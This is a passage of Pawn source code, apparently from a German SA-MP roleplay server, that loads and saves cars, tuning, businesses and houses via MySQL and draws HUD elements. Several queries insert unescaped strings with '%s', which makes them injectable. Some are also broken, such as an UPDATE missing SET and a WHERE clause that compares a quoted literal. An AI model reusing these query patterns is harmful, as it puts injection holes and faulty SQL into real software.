		printf("%s",query);
	}
	return 1;
}
/*stock Tuningladen(playerid,i)
{
	new string[300],data[40];
	format(string,sizeof string,"SELECT * FROM autotuning WHERE sID='%d' AND Slot='%d'",SpielerInfo[playerid][uID],i);
	mysql_query(dbhandle, string);
	printf("%s",string);

	mysql_fetch_field("SideL",data);
	STuning[playerid][i][SideL] = strval(data);
	mysql_fetch_field("SideR",data);
	STuning[playerid][i][SideR] = strval(data);
	mysql_fetch_field("Auspuff",data);
	STuning[playerid][i][Auspuff] = strval(data);
	mysql_fetch_field("Spoiler",data);
	STuning[playerid][i][Spoiler] = strval(data);
	mysql_fetch_field("Dach",data);
	STuning[playerid][i][Dach] = strval(data);
	mysql_fetch_field("VStos",data);
	STuning[playerid][i][VStos] = strval(data);
	mysql_fetch_field("HStos",data);
	STuning[playerid][i][HStos] = strval(data);
	mysql_fetch_field("Paintjob",data);
	STuning[playerid][i][Paintjob] = strval(data);
	if(SAuto[playerid][i][sreperatur] == 0)
	{
		AddVehicleComponent(SAuto[playerid][i][sID],STuning[playerid][i][SideL]);
		AddVehicleComponent(SAuto[playerid][i][sID],STuning[playerid][i][SideR]);
		AddVehicleComponent(SAuto[playerid][i][sID],STuning[playerid][i][Auspuff]);
		AddVehicleComponent(SAuto[playerid][i][sID],STuning[playerid][i][Spoiler]);
		AddVehicleComponent(SAuto[playerid][i][sID],STuning[playerid][i][Dach]);
		AddVehicleComponent(SAuto[playerid][i][sID],STuning[playerid][i][VStos]);
		AddVehicleComponent(SAuto[playerid][i][sID],STuning[playerid][i][HStos]);
	}

	return 1;
}*/
stock Gangwarpunkten()
{
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uEingeloggt] == 1)
	    {
	        if(gangwaran == 1)
	        {
	     		if(IsPlayerInArea(i,gwminx,gwminy,gwmaxx,gwmaxy))
			    {
			        WFrak(i);
			        if(Mitglied[i] == gangwarteam1)
			        {
			            if(SpielerInfo[i][uAFK] != 300)
			            {
			            	gangwarteam1kills ++;
						}
						else
						{
						    gangwarteam1kills --;
						}
			        }
			        if(Mitglied[i] == gangwarteam2)
			        {
			            if(SpielerInfo[i][uAFK] != 300)
			            {
			            	gangwarteam2kills ++;
						}
						else
						{
						    gangwarteam2kills --;
						}
			        }
			    }
			}
		}
	}
}
stock Tuningladen(playerid,i)
{
	new string[300], iint;
	format(string,sizeof string,"SELECT * FROM autotuning WHERE sID='%d' AND Slot='%d'",SpielerInfo[playerid][uID],i);
	mysql_query(dbhandle, string, true);
	printf("%s",string);
	iint = cache_get_field_content_int(0, "SideL");
	STuning[playerid][i][SideL] = iint;
	iint = cache_get_field_content_int(0, "SideR");
	STuning[playerid][i][SideR] = iint;
	iint = cache_get_field_content_int(0, "Auspuff");
	STuning[playerid][i][Auspuff] = iint;
	iint = cache_get_field_content_int(0, "Spoiler");
	STuning[playerid][i][Spoiler] = iint;
	iint = cache_get_field_content_int(0, "Dach");
	STuning[playerid][i][Dach] = iint;
	iint = cache_get_field_content_int(0, "VStos");
	STuning[playerid][i][VStos] = iint;
	iint = cache_get_field_content_int(0, "HStos");
	STuning[playerid][i][HStos] = iint;
	iint = cache_get_field_content_int(0, "Paintjob");
	STuning[playerid][i][Paintjob] = iint;
	iint = cache_get_field_content_int(0, "Reifen");
	STuning[playerid][i][Reifen] = iint;
	if(SAuto[playerid][i][sreperatur] == 0)
	{
		AddVehicleComponent(SAuto[playerid][i][sID],STuning[playerid][i][SideL]);
		//AddVehicleComponent(SAuto[playerid][i][sID],STuning[playerid][i][SideR]);
		AddVehicleComponent(SAuto[playerid][i][sID],STuning[playerid][i][Auspuff]);
		AddVehicleComponent(SAuto[playerid][i][sID],STuning[playerid][i][Spoiler]);
		AddVehicleComponent(SAuto[playerid][i][sID],STuning[playerid][i][Dach]);
		AddVehicleComponent(SAuto[playerid][i][sID],STuning[playerid][i][VStos]);
		AddVehicleComponent(SAuto[playerid][i][sID],STuning[playerid][i][HStos]);
		AddVehicleComponent(SAuto[playerid][i][sID],STuning[playerid][i][Reifen]);
		ChangeVehiclePaintjob(SAuto[playerid][i][sID], STuning[playerid][i][Paintjob]);
	}
	return 1;
}
stock Paintjobspeichern(playerid,fslot,paintjob)
{
	new query[120];
	new x = fslot;
    format(query,sizeof query,"UPDATE autotuning SET Paintjob='%d' WHERE sID='%d' AND Slot='%d'",
    paintjob,SpielerInfo[playerid][uID],x);
    mysql_query(dbhandle, query);
    printf("%s",query);
	return 1;
}
stock Tuningspeichern(playerid,fslot)
{
	new query[800];
	new x = fslot;
    new links = GetVehicleComponentInSlot(SAuto[playerid][x][sID], CARMODTYPE_SIDESKIRT);
    new rechts = GetVehicleComponentInSlot(SAuto[playerid][x][sID], CARMODTYPE_VENT_RIGHT);
    new ausp = GetVehicleComponentInSlot(SAuto[playerid][x][sID], CARMODTYPE_EXHAUST);
    new spo = GetVehicleComponentInSlot(SAuto[playerid][x][sID], CARMODTYPE_SPOILER);
    new roo = GetVehicleComponentInSlot(SAuto[playerid][x][sID], CARMODTYPE_ROOF);
    new afront = GetVehicleComponentInSlot(SAuto[playerid][x][sID], CARMODTYPE_FRONT_BUMPER);
    new aheck = GetVehicleComponentInSlot(SAuto[playerid][x][sID], CARMODTYPE_REAR_BUMPER);
    new areifen = GetVehicleComponentInSlot(SAuto[playerid][x][sID], CARMODTYPE_WHEELS);
    format(query,sizeof query,"UPDATE autotuning SET SideL='%d', SideR='%d',Auspuff='%d',Spoiler='%d',Dach='%d',VStos='%d',HStos='%d',Reifen='%d' WHERE sID='%d' AND Slot='%d'",
    links,rechts,ausp,spo,roo,afront,aheck,areifen,SpielerInfo[playerid][uID],x);
    mysql_query(dbhandle, query);
    printf("%s",query);
	return 1;
}

stock AutoTuningxx(playerid)
{
	new query[1200];
    for(new x = 0; x < 2; x++)
	{
	    if(SAuto[playerid][x][sID] != -1)
	    {
			format(query,sizeof query,"UPDATE cars farbe1='%d',farbe2='%d',nitro='%d',hydraulik='%d',Motorschaden='%d' WHERE ID='%d' AND Nummer='%d'",
			SAuto[playerid][x][sFarbe1],SAuto[playerid][x][sFarbe2],GetVehicleComponentInSlot(SAuto[playerid][x][sID],CARMODTYPE_NITRO),GetVehicleComponentInSlot(SAuto[playerid][x][sID],CARMODTYPE_HYDRAULICS),Motorschaden2[SAuto[playerid][x][sID]],SpielerInfo[playerid][uID],x);
			mysql_query(dbhandle, query);
			printf("%s",query);
		}
	}
	return 1;
}
stock Autosspeichern(playerid)
{
	new query[1200];
    for(new x = 0; x < 2; x++)
	{
	    if(SAuto[playerid][x][sID] != -1)
	    {
	   		new Float:ssx,Float:ssy,Float:ssz,Float:ssa;
	   		GetVehiclePos(SAuto[playerid][x][sID],ssx,ssy,ssz);//vorherSAuto[playerid][x][sX],SAuto[playerid][x][sY],SAuto[playerid][x][sZ],SAuto[playerid][x][sA]
	   		GetVehicleZAngle(SAuto[playerid][x][sID],ssa);
	   		if(SAuto[playerid][x][sID] > -1) SAuto[playerid][x][sKilometer] = (Meter[SAuto[playerid][x][sID]]+GetDistanceToLastPoint(SAuto[playerid][x][sID])) / 250;
			format(query,sizeof query,"UPDATE cars SET X='%.3f',Y='%.3f',Z='%.3f',A='%.3f',Model='%d',Preis='%.2f',Zustand='%.2f',Kennzeichen='%s',Kilometer='%d',abgeschleppt='%d',reperatur='%d',farbe1='%d',farbe2='%d',nitro='%d',hydraulik='%d',Tank='%d',Motorschaden='%d' WHERE ID='%d' AND Nummer='%d'",
			SAuto[playerid][x][sX],SAuto[playerid][x][sY],SAuto[playerid][x][sZ],SAuto[playerid][x][sA],SAuto[playerid][x][sModel],SAuto[playerid][x][sPreis],SAuto[playerid][x][sZustand],SAuto[playerid][x][sKennzeichen],SAuto[playerid][x][sKilometer],SAuto[playerid][x][abgeschleppt],SAuto[playerid][x][sreperatur],
			SAuto[playerid][x][sFarbe1],SAuto[playerid][x][sFarbe2],GetVehicleComponentInSlot(SAuto[playerid][x][sID],CARMODTYPE_NITRO),GetVehicleComponentInSlot(SAuto[playerid][x][sID],CARMODTYPE_HYDRAULICS),Benzin[SAuto[playerid][x][sID]],Motorschaden2[SAuto[playerid][x][sID]],SpielerInfo[playerid][uID],x);
			mysql_query(dbhandle, query);
			printf("%s",query);
		}
	}
	return 1;
}
Bizzesladen()
{
	new data[128],id,string[200], iint, Float:ffloat;
	format(string,sizeof string,"SELECT * FROM geschaft WHERE 'ID' < 13");
	mysql_query(dbhandle, string, true);
	printf("%s",string);

	for(new i=0; i<cache_num_rows(); i++)
	{
		iint = cache_get_field_content_int(i, "ID");
		id = iint;
		iint = cache_get_field_content_int(i, "Besitzer");
		BizInfo[id][bbesitzer] = iint;
		ffloat = cache_get_field_content_float(i, "Preis");
		BizInfo[id][bpreis] = ffloat;
		iint = cache_get_field_content_int(i, "BizNummer");
		BizInfo[id][bnummer] = iint;
		ffloat = cache_get_field_content_float(i, "BizKasse");
		BizInfo[id][bkasse] = ffloat;
		cache_get_field_content(i, "Name",data);
		format(BizInfo[id][bname],100,"%s",data);
		iint = cache_get_field_content_int(i, "Tankstelle");
		BizInfo[id][btankstelle] = iint;
		ffloat = cache_get_field_content_float(i, "Benzinpreis");
		BizInfo[id][bbenzinpreis] = ffloat;
		ffloat = cache_get_field_content_float(i, "Dieselpreis");
		BizInfo[id][bdieselpreis] = ffloat;
		iint = cache_get_field_content_int(i, "Sprit");
		BizInfo[id][bSprit] = iint;
		if(BizInfo[id][bbesitzer] == -1)
		{
			BizInfo[id][bSchild] = CreateDynamicObject(19471,BizDaten[id][bSchildX],BizDaten[id][bSchildY],BizDaten[id][bSchildZ],BizDaten[id][bSchildRX],BizDaten[id][bSchildRY],BizDaten[id][bSchildRZ]);
			BizInfo[id][bNummers] = CreateDynamicObject(19329, BizDaten[id][bNummerX],BizDaten[id][bNummerY],BizDaten[id][bNummerZ],BizDaten[id][bNummerRX],BizDaten[id][bNummerRY],BizDaten[id][bNummerRZ]);
			format(string,sizeof string,"Geschäftsnummer: %d\nBesitzer: %s",BizInfo[id][bnummer],BizInfo[id][bname]);
			SetDynamicObjectMaterialText(BizInfo[id][bNummers],0,string,OBJECT_MATERIAL_SIZE_256x128,"Arial",23,1,0xFFFFFFFF,0x3C3C3CFF,OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
		}
		else
		{
	        if(BizInfo[id][bbesitzer] != -1)
	        {
				BizInfo[id][bNummers] = CreateDynamicObject(19329, BizDaten[id][bNummerX],BizDaten[id][bNummerY],BizDaten[id][bNummerZ],BizDaten[id][bNummerRX],BizDaten[id][bNummerRY],BizDaten[id][bNummerRZ]);
				format(string,sizeof string,"Geschäftsnummer: %d\nBesitzer: %s",BizInfo[id][bnummer],BizInfo[id][bname]);
				SetDynamicObjectMaterialText(BizInfo[id][bNummers],0,string,OBJECT_MATERIAL_SIZE_256x128,"Arial",23,1,0xFFFFFFFF,0x3C3C3CFF,OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
			}
		}
		if(id == 10)
		{
		    format(string,sizeof(string),"Diesel: %.2f$",BizInfo[id][bdieselpreis]);
			SetDynamicObjectMaterialText(Tankstelle3, 2, string, 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF2D3A35, 1);
			format(string,sizeof(string),"Benzin: %.2f$",BizInfo[id][bbenzinpreis]);
			SetDynamicObjectMaterialText(Tankstelle3, 3,string, 90, "Arial", 24, 0, 0xFFFFFFFF, 0xFF193826, 1);
			format(string,sizeof(string),"Besitzer: %s",BizInfo[id][bname]);
			SetDynamicObjectMaterialText(Tankstelle3, 4,string, 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF635C5A, 1);
		}
		if(id == 11)
		{
		    format(string,sizeof(string),"Diesel: %.2f$",BizInfo[id][bdieselpreis]);
			SetDynamicObjectMaterialText(Tankstelle1, 2, string, 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF2D3A35, 1);
			format(string,sizeof(string),"Benzin: %.2f$",BizInfo[id][bbenzinpreis]);
			SetDynamicObjectMaterialText(Tankstelle1, 3,string, 90, "Arial", 24, 0, 0xFFFFFFFF, 0xFF193826, 1);
			format(string,sizeof(string),"Besitzer: %s",BizInfo[id][bname]);
			SetDynamicObjectMaterialText(Tankstelle1, 4,string, 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF635C5A, 1);
		}
		if(id == 12)
		{
		    format(string,sizeof(string),"Diesel: %.2f$",BizInfo[id][bdieselpreis]);
			SetDynamicObjectMaterialText(Tankstelle2, 2, string, 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF2D3A35, 1);
			format(string,sizeof(string),"Benzin: %.2f$",BizInfo[id][bbenzinpreis]);
			SetDynamicObjectMaterialText(Tankstelle2, 3,string, 90, "Arial", 24, 0, 0xFFFFFFFF, 0xFF193826, 1);
			format(string,sizeof(string),"Besitzer: %s",BizInfo[id][bname]);
			SetDynamicObjectMaterialText(Tankstelle2, 4,string, 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF635C5A, 1);
		}
	}

	printf("%d Geschäfte wurden geladen.",id+1);
	return 1;
}

HaeuserBizzLaden()
{
	new data[128],id,string[200], iint, Float:ffloat;
	format(string,sizeof string,"SELECT * FROM häuser WHERE 'ID' < 2");
	mysql_query(dbhandle, string);
	printf("%s",string);

	for(new i=0; i<cache_num_rows(); i++)
	{
		iint = cache_get_field_content_int(i, "ID");
		id = iint;
		iint = cache_get_field_content_int(i, "Besitzer");
		HausInfo[id][hBesitzer] = iint;
		ffloat = cache_get_field_content_float(i, "Preis");
		HausInfo[id][hPreis] = ffloat;
		iint = cache_get_field_content_int(i, "Erfahrung");
		HausInfo[id][hErfahrung] = iint;
		iint = cache_get_field_content_int(i, "Hotel");
		HausInfo[id][hHotel] = iint;
		ffloat = cache_get_field_content_float(i, "Miete");
		HausInfo[id][hMiete] = ffloat;
		iint = cache_get_field_content_int(i, "Hausnummer");
		HausInfo[id][sphnummer] = iint;
		ffloat = cache_get_field_content_float(i, "SpawnX");
		HausInfo[id][hSpawnX] = ffloat;
		ffloat = cache_get_field_content_float(i, "SpawnY");
		HausInfo[id][hSpawnY] = ffloat;
		ffloat = cache_get_field_content_float(i, "SpawnZ");
		HausInfo[id][hSpawnZ] = ffloat;
		cache_get_field_content(i, "Name",data);
		format(HausInfo[id][hName],100,"%s",data);
		if(HausInfo[id][hHotel] == 0)
		{
			if(HausInfo[id][hBesitzer] == -1)
			{
				HausInfo[id][hSchild] = CreateDynamicObject(19471,HausDaten[id][hSchildX],HausDaten[id][hSchildY],HausDaten[id][hSchildZ],HausDaten[id][hSchildRX],HausDaten[id][hSchildRY],HausDaten[id][hSchildRZ]);
 				HausInfo[id][hNummer] = CreateDynamicObject(19329, HausDaten[id][hNummerX],HausDaten[id][hNummerY],HausDaten[id][hNummerZ],HausDaten[id][hNummerRX],HausDaten[id][hNummerRY],HausDaten[id][hNummerRZ]);
				format(string,sizeof string,"Hausnummer: %d\nBesitzer: %s",HausInfo[id][sphnummer],HausInfo[id][hName]);
  				SetDynamicObjectMaterialText(HausInfo[id][hNummer],0,string,OBJECT_MATERIAL_SIZE_256x128,"Arial",23,1,0xFFFFFFFF,0x3C3C3CFF,OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
  				HausInfo[id][Schildlabel] = Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,HausDaten[id][hSchildX],HausDaten[id][hSchildY],HausDaten[id][hSchildZ]+0.4,10.0,0,0);
			}
			else
			{
		        if(HausInfo[id][hBesitzer] != -1)
		        {
           			HausInfo[id][hNummer] = CreateDynamicObject(19329, HausDaten[id][hNummerX],HausDaten[id][hNummerY],HausDaten[id][hNummerZ],HausDaten[id][hNummerRX],HausDaten[id][hNummerRY],HausDaten[id][hNummerRZ]);
					format(string,sizeof string,"Hausnummer: %d\nBesitzer: %s",HausInfo[id][sphnummer],HausInfo[id][hName]);
            		SetDynamicObjectMaterialText(HausInfo[id][hNummer],0,string,OBJECT_MATERIAL_SIZE_256x128,"Arial",23,1,0xFFFFFFFF,0x3C3C3CFF,OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
				}
			}
            HausInfo[id][hArea] = CreateDynamicPolygon(HausAreaDaten[id], 3.7, 10.7);
		}
	}

	printf("%d Häuser wurden geladen.",id+1);
	for(new x = 0; x < MAX_HAEUSER; x++)
	{
	    Moebelanzahl[x] = 0;
	}
	return 1;
}

forward Autohausladen();
public Autohausladen()
{
	new str[20],ID;
    new iint, Float:ffloat;
	mysql_query(dbhandle, "SELECT * FROM autohaus", true);
	print("----- AUtohaus-----");
	printf("Datensätze: %i", cache_num_rows());
	for(new i=0; i<cache_num_rows(); i++)
	{
	    iint = cache_get_field_content_int(i, "ID");
		ID = iint;
		AutoInfo[ID][iID] = ID;
	    iint = cache_get_field_content_int(i, "Model");
	    AutoInfo[ID][iModel] = iint;
	    ffloat = cache_get_field_content_float(i, "X");
	    AutoInfo[ID][iX] = ffloat;
	    ffloat = cache_get_field_content_float(i, "Y");
	    AutoInfo[ID][iY] = ffloat;
	    ffloat = cache_get_field_content_float(i, "Z");
	    AutoInfo[ID][iZ] = ffloat;
	    ffloat = cache_get_field_content_float(i, "A");
	    AutoInfo[ID][iA] = ffloat;
	    ffloat = cache_get_field_content_float(i, "Preis");
	    AutoInfo[ID][iPreis] = ffloat;
	    AutoInfo[ID][erstellt] = 1;
	    AutoInfo[ID][iCreate] = CreateVehicle(AutoInfo[ID][iModel],AutoInfo[ID][iX],AutoInfo[ID][iY],AutoInfo[ID][iZ],AutoInfo[ID][iA],-1,-1,-1);
	    format(str,sizeof(str),"AH %d",ID);
	    SetVehicleNumberPlate(AutoInfo[ID][iCreate], str);
	    printf("Model = %i", AutoInfo[ID][iModel]);
	    new tmp = AutoInfo[ID][iModel]-399;
	    Benzin[AutoInfo[ID][iCreate]] = AutoDaten[tmp][MaxBenzin];
    	Meter[AutoInfo[ID][iCreate]]=0;
		Meter2[AutoInfo[ID][iCreate]]=0;
		new engine, lights, alarm, doors, bonnet, boot, objective;
		GetVehicleParamsEx(AutoInfo[ID][iCreate], engine, lights, alarm, doors, bonnet, boot, objective);
		SetVehicleParamsEx(AutoInfo[ID][iCreate], engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
	}
	print("-----Autohaus ende----");

	mysql_query(dbhandle, "SELECT * FROM hausmoebel");

	new Float:X,Float:Y,Float:Z,Float:RX,Float:RY,Float:RZ;
	for(new i=0; i<cache_num_rows(); i++)
	{
	    iint = cache_get_field_content_int(i, "Haus");
		ID = iint;
		printf("%d",ID);
	    iint = cache_get_field_content_int(i, "Modell");
	    Moebelmodell[ID][Moebelanzahl[ID]] = iint;
	    ffloat = cache_get_field_content_float(i, "X");
	    X = ffloat;
	    ffloat = cache_get_field_content_float(i, "Y");
	    Y = ffloat;
	    ffloat = cache_get_field_content_float(i, "Z");
	    Z = ffloat;
	    ffloat = cache_get_field_content_float(i, "RX");
	    RX = ffloat;
	    ffloat = cache_get_field_content_float(i, "RY");
	    RY = ffloat;
	    ffloat = cache_get_field_content_float(i, "RZ");
	    RZ = ffloat;
	    Moebel[ID][Moebelanzahl[ID]] = CreateDynamicObjectEx(Moebelmodell[ID][Moebelanzahl[ID]],X,Y,Z,RX,RY,RZ,20,20);
	    Moebelanzahl[ID]++;
	}


}
Autohausspeichern(ai)
{
    new query[500];
	format(query,sizeof(query),"UPDATE autohaus SET ID='%d',Model='%d',X='%.3f',Y='%.3f',Z='%.3f',A='%.3f',Preis='%.2f' WHERE `ID`='%d'",
    AutoInfo[ai][iID],
    AutoInfo[ai][iModel],
    AutoInfo[ai][iX],
    AutoInfo[ai][iY],
	AutoInfo[ai][iZ],
	AutoInfo[ai][iA],
	AutoInfo[ai][iPreis],
    ai);
    if(AutoInfo[ai][erstellt] == 0)
    {
        AutoInfo[ai][erstellt] = 1;
        AutoInfo[ai][iCreate] = CreateVehicle(AutoInfo[ai][iModel],AutoInfo[ai][iX],AutoInfo[ai][iY],AutoInfo[ai][iZ],AutoInfo[ai][iA],-1,-1,-1);
        Benzin[AutoInfo[ai][iCreate]] = AutoDaten[AutoInfo[ai][iModel]-399][MaxBenzin];
       	Meter[AutoInfo[ai][iCreate]]=0;
		Meter2[AutoInfo[ai][iCreate]]=0;
		Motorschaden2[AutoInfo[ai][iCreate]] = 0;
		new engine, lights, alarm, doors, bonnet, boot, objective;
		GetVehicleParamsEx(AutoInfo[ai][iCreate], engine, lights, alarm, doors, bonnet, boot, objective);
		SetVehicleParamsEx(AutoInfo[ai][iCreate], engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
	}
    else
    {
        DestroyVehicle(AutoInfo[ai][iCreate]);
        AutoInfo[ai][iCreate] = CreateVehicle(AutoInfo[ai][iModel],AutoInfo[ai][iX],AutoInfo[ai][iY],AutoInfo[ai][iZ],AutoInfo[ai][iA],-1,-1,-1);
        Benzin[AutoInfo[ai][iCreate]] = AutoDaten[AutoInfo[ai][iModel]-399][MaxBenzin];
       	Meter[AutoInfo[ai][iCreate]]=0;
		Meter2[AutoInfo[ai][iCreate]]=0;
		Motorschaden2[AutoInfo[ai][iCreate]] = 0;
		new engine, lights, alarm, doors, bonnet, boot, objective;
		GetVehicleParamsEx(AutoInfo[ai][iCreate], engine, lights, alarm, doors, bonnet, boot, objective);
		SetVehicleParamsEx(AutoInfo[ai][iCreate], engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
	}
    mysql_query(dbhandle, query);
    printf("%s",query);

}
Geschaftspeichern(geschaeftid)
{
	new query[350];
	format(query,sizeof(query),"UPDATE geschaft SET Name='%s',Besitzer='%d',Benzinpreis='%.2f',Dieselpreis='%.2f',BizKasse='%.2f',Sprit='%d' WHERE `ID`=%d",
    BizInfo[geschaeftid][bname],
	BizInfo[geschaeftid][bbesitzer],
	BizInfo[geschaeftid][bbenzinpreis],
	BizInfo[geschaeftid][bdieselpreis],
	BizInfo[geschaeftid][bkasse],
	BizInfo[geschaeftid][bSprit],
	geschaeftid);
	mysql_query(dbhandle, query);
	printf("%s",query);

}
HausSpeichern(hausid)
{
    new query[350];
	format(query,sizeof(query),"UPDATE häuser SET Besitzer='%d',Miete='%.2f',Name='%s' WHERE `ID`='%d'",
    HausInfo[hausid][hBesitzer],
    HausInfo[hausid][hMiete],
    HausInfo[hausid][hName],
    hausid);
    mysql_query(dbhandle, query);
    printf("%s",query);

}
GetPlayerID(const playername[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
   		{
   			if(strcmp(PlayerName(i), playername, true) == 0)
       		{
       			return i;
       		}
   		}
	}
	return INVALID_PLAYER_ID;
}
forward GeldAnzeigepl(playerid);
public GeldAnzeigepl(playerid)
{
	TextDrawHideForPlayer(playerid,GeldAnzeige[0]);
	TextDrawHideForPlayer(playerid,GeldAnzeige[1]);
	TextDrawHideForPlayer(playerid,GeldAnzeige[2]);
	PlayerTextDrawHide(playerid,GeldAnzeigewert[playerid]);
	PlayerTextDrawDestroy(playerid,GeldAnzeigewert[playerid]);
	new string[10];
	format(string,sizeof string,"%.2f",SpielerInfo[playerid][uGeld]);
	GeldAnzeigewert[playerid] = CreatePlayerTextDraw(playerid,512.000000, 80.000000, string);
	PlayerTextDrawBackgroundColor(playerid,GeldAnzeigewert[playerid], 9961727);
	PlayerTextDrawFont(playerid,GeldAnzeigewert[playerid], 2);
	PlayerTextDrawLetterSize(playerid,GeldAnzeigewert[playerid], 0.260000, 1.700000);
	PlayerTextDrawColor(playerid,GeldAnzeigewert[playerid], -1);
	PlayerTextDrawSetOutline(playerid,GeldAnzeigewert[playerid], 0);
	PlayerTextDrawSetProportional(playerid,GeldAnzeigewert[playerid], 1);
	PlayerTextDrawSetShadow(playerid,GeldAnzeigewert[playerid], 0);
	PlayerTextDrawSetSelectable(playerid,GeldAnzeigewert[playerid], 0);
	TextDrawShowForPlayer(playerid,GeldAnzeige[0]);
	TextDrawShowForPlayer(playerid,GeldAnzeige[1]);
	TextDrawShowForPlayer(playerid,GeldAnzeige[2]);
	PlayerTextDrawShow(playerid,GeldAnzeigewert[playerid]);
	return 1;
}
forward Missionenaktu(playerid);
public Missionenaktu(playerid)
{
    if(SpielerInfo[playerid][ufMissionen] == 0)
	{
		PlayerTextDrawSetString(playerid,Missionen[playerid][3],"ld_chat:thumbdn");
 	}
 	else
 	{
 	    PlayerTextDrawSetString(playerid,Missionen[playerid][3],"ld_chat:thumbup");
 	}
 	if(SpielerInfo[playerid][ufPerso] == 0)
	{
		PlayerTextDrawSetString(playerid,Missionen[playerid][5],"ld_chat:thumbdn");
 	}
 	else
 	{
 	    PlayerTextDrawSetString(playerid,Missionen[playerid][5],"ld_chat:thumbup");
 	}
 	if(SpielerInfo[playerid][ufBeruf] == 0)
	{
		PlayerTextDrawSetString(playerid,Missionen[playerid][7],"ld_chat:thumbdn");
 	}
 	else
 	{
 	    PlayerTextDrawSetString(playerid,Missionen[playerid][7],"ld_chat:thumbup");
 	}
 	if(SpielerInfo[playerid][ufFuhrerschein] == 0)
	{
		PlayerTextDrawSetString(playerid,Missionen[playerid][9],"ld_chat:thumbdn");
 	}
 	else
 	{
 	    PlayerTextDrawSetString(playerid,Missionen[playerid][9],"ld_chat:thumbup");
 	}
 	if(SpielerInfo[playerid][ufATM] == 0)
	{
		PlayerTextDrawSetString(playerid,Missionen[playerid][11],"ld_chat:thumbdn");
 	}
 	else
 	{
 	    PlayerTextDrawSetString(playerid,Missionen[playerid][11],"ld_chat:thumbup");
 	}
 	if(SpielerInfo[playerid][ufAutokauf] == 0)
	{
		PlayerTextDrawSetString(playerid,Missionen[playerid][13],"ld_chat:thumbdn");
 	}
 	else
 	{
 	    PlayerTextDrawSetString(playerid,Missionen[playerid][13],"ld_chat:thumbup");
 	}
 	if(SpielerInfo[playerid][ufShop] == 0)
	{
		PlayerTextDrawSetString(playerid,Missionen[playerid][15],"ld_chat:thumbdn");
 	}
 	else
 	{
 	    PlayerTextDrawSetString(playerid,Missionen[playerid][15],"ld_chat:thumbup");
 	}
 	if(SpielerInfo[playerid][ufHandy] == 0)
	{
		PlayerTextDrawSetString(playerid,Missionen[playerid][17],"ld_chat:thumbdn");
 	}
 	else
 	{
 	    PlayerTextDrawSetString(playerid,Missionen[playerid][17],"ld_chat:thumbup");
 	}
 	if(SpielerInfo[playerid][ufAngel] == 0)
	{
		PlayerTextDrawSetString(playerid,Missionen[playerid][19],"ld_chat:thumbdn");
 	}
 	else
 	{
 	    PlayerTextDrawSetString(playerid,Missionen[playerid][19],"ld_chat:thumbup");
 	}
 	if(SpielerInfo[playerid][ufMarkt] == 0)
	{
		PlayerTextDrawSetString(playerid,Missionen[playerid][21],"ld_chat:thumbdn");
 	}
 	else
 	{
 	    PlayerTextDrawSetString(playerid,Missionen[playerid][21],"ld_chat:thumbup");
 	}
 	if(SpielerInfo[playerid][ufWaffenschein] == 0)
	{
		PlayerTextDrawSetString(playerid,Missionen[playerid][23],"ld_chat:thumbdn");
 	}
 	else
 	{
 	    PlayerTextDrawSetString(playerid,Missionen[playerid][23],"ld_chat:thumbup");
 	}
 	if(SpielerInfo[playerid][ufGras] == 0)
	{
		PlayerTextDrawSetString(playerid,Missionen[playerid][25],"ld_chat:thumbdn");
 	}
 	else
 	{
 	    PlayerTextDrawSetString(playerid,Missionen[playerid][25],"ld_chat:thumbup");
 	}
 	if(SpielerInfo[playerid][ufSchwarz] == 0)
	{
		PlayerTextDrawSetString(playerid,Missionen[playerid][27],"ld_chat:thumbdn");
 	}
 	else
 	{
 	    PlayerTextDrawSetString(playerid,Missionen[playerid][27],"ld_chat:thumbup");
 	}
 	if(SpielerInfo[playerid][ufBombe] == 0)
	{
		PlayerTextDrawSetString(playerid,Missionen[playerid][29],"ld_chat:thumbdn");
 	}
 	else
 	{
 	    PlayerTextDrawSetString(playerid,Missionen[playerid][29],"ld_chat:thumbup");
 	}
 	return 1;
}
forward Missionenanzeige(playerid);
public Missionenanzeige(playerid)
{
	if(SpielerInfo[playerid][uMissionen] == 1)
	{
	    for(new i = 0; i < 30; i++)
	    {
			PlayerTextDrawHide(playerid,Missionen[playerid][i]);
			SpielerInfo[playerid][uMissionen] = 0;
		}
	}
	else
	{
	    for(new i = 0; i < 30; i++)
	    {
	    	PlayerTextDrawShow(playerid,Missionen[playerid][i]);
	    	SpielerInfo[playerid][uMissionen] = 1;
	    	Missionenaktu(playerid);
		}
	}
	return 1;
}
forward WantedAnzeige(playerid);
public WantedAnzeige(playerid)
{
	PlayerTextDrawHide(playerid,Wantedtext[0][playerid]);
	PlayerTextDrawDestroy(playerid,Wantedtext[0][playerid]);
	PlayerTextDrawHide(playerid,Wantedtext[1][playerid]);
	PlayerTextDrawDestroy(playerid,Wantedtext[1][playerid]);

	Wantedtext[0][playerid] = CreatePlayerTextDraw(playerid,558.000000, 104.000000, " ");
	PlayerTextDrawBackgroundColor(playerid,Wantedtext[0][playerid], 255);
	PlayerTextDrawFont(playerid,Wantedtext[0][playerid], 2);
	PlayerTextDrawLetterSize(playerid,Wantedtext[0][playerid], 0.180000, 1.299999);
	PlayerTextDrawColor(playerid,Wantedtext[0][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Wantedtext[0][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Wantedtext[0][playerid], 1);
	PlayerTextDrawSetShadow(playerid,Wantedtext[0][playerid], 0);
	PlayerTextDrawSetSelectable(playerid,Wantedtext[0][playerid], 0);

	Wantedtext[1][playerid] = CreatePlayerTextDraw(playerid,546.000000, 104.000000, "]");
